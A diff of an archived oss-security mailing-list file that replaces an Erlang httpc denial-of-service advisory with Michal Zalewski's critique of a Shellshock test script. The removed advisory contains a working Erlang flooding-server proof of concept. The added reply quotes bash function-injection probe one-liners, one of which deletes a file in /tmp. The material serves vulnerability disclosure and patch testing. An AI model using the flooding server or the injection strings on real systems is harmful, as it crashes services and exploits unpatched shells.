@@ -1,86 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/02/3
-Message-ID: <CAM4=iJ31bUjj45d6VUy08+NVE-+j0HGP2ZHe9FUOpYfTDdZHsg@mail.gmail.com>
-Date: Fri, 2 May 2014 13:13:12 +0200
-From: Seba <argos83@...il.com>
-To: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Erlang OTP's httpc module Denial of Service
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/02/33
+Message-ID: <CALx_OUBmeDQS7i8BZYQoRO+TyhTWZhYDa0EXtrNbPoUQvNHQSg@mail.gmail.com>
+Date: Thu, 2 Oct 2014 08:04:24 -0700
+From: Michal Zalewski <lcamtuf@...edump.cx>
+To: oss-security <oss-security@...ts.openwall.com>
+Cc: Shawn <citypw@...il.com>
+Subject: Re: more bash parser bugs (CVE-2014-6277, CVE-2014-6278)
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+> According to shellshock  test (https://shellshocker.net/shellshock_test.sh)
 
-  I've reported this issue to erlang-bugs mailing list:
-http://erlang.org/pipermail/erlang-bugs/2014-May/004369.html
+That script is a weird mixture of tests that implicitly pay no
+attention to Florian's patch, and therefore do not really demonstrate
+any security risk:
 
-Regards,
+CVE20147186=$((bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF
+<<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' 2>/dev/null || echo
+"vulnerable") | grep 'vulnerable' | wc -l)
 
-Sebastián Tello.
+...ones that explicitly try to circumvent it in a way that makes them
+uninteresting from the security perspective:
 
+CVE20146271=$(env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() {
+:;}; echo vulnerable' bash -c "echo test" 2>&1 | grep 'vulnerable' |
+wc -l)
 
-Using httpc to connect to a malicious server can cause the system to run
-out of memory and crash.
+...and ones that will fail with Florian's patch:
 
-Description
-===========
+CVE20147169=$((cd /tmp; rm -f /tmp/echo; env X='() { (a)=>\' bash -c
+"echo echo nonvuln" 2>/dev/null; [[ "$(cat echo 2> /dev/null)" ==
+"nonvuln" ]] && echo "vulnerable" 2> /dev/null) | grep 'vulnerable' |
+wc -l)
 
-When requesting a URL from an untrusted source using the httpc OTP module,
-if the server:
- - accepts the connection
- - does not read from the socket
- - and indefinitely writes bytes in the socket.
+There are also some weird / duplicat entries and general confusion
+about which CVE stands for what, e.g.:
 
-Then the client will keep on allocating memory until the system crashes.
+CVE2014=$(env X=' () { }; echo hello' bash -c 'date' | grep 'hello' | wc -l)
+echo -n "CVE-2014-//// (exploit 3 on http://shellshocker.net/): "
 
-Proof of concept
-================
+Really, just install the patch. The reasons for this, and a good test
+case to check if you're covered, are discussed here:
 
-Server-side (attacker):
+http://lcamtuf.blogspot.com/2014/09/bash-bug-apply-unofficial-patch-now.html
 
-==== PoC module: httpc_dos.erl ====
--module(httpc_dos).
+If you want to learn a bit more about what these test cases are doing
+and why it matters, I have an earlier post here:
 
--export([server/1, server/0]).
+http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html
 
-server() -> server(5678).
-server(Port)->
-  {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},
-                                        {active, false}]),
-  {ok, Sock} = gen_tcp:accept(LSock),
-  socket_write(Sock).
+...and last but not least, the details for the last two bugs are here:
 
-socket_write(Sock) ->
-    ok = gen_tcp:send(Sock, lists:flatten(lists:duplicate(4096, "A"))),
-    socket_write(Sock).
-======== EOF =====
+http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html
 
-Start the server (use the above module).
-
-1> httpc_dos:server(5678).
-
-
-Client-side (httpc), connect to the server:
-
-$ erl
-Erlang/OTP 17 [erts-6.0] [source] [64-bit] [smp:4:4] [async-threads:10]
-[hipe] [kernel-poll:false]
-
-Eshell V6.0  (abort with ^G)
-1> application:start(inets).
-ok
-2> httpc:request("http://SERVER_IP:5678").
-
-Crash dump was written to: erl_crash.dump
-eheap_alloc: Cannot allocate 1167696400 bytes of memory (of type "heap").
-
-Tested on
-=========
-OTP 17
-Ubuntu 12.04 x86_64
-
-Workaround
-==========
-
-Use lhttpc (https://github.com/esl/lhttpc).I haven't been able to reproduce
-the issue using lhttpc
-as the call will crash when the response size is too large.
-
+/mz
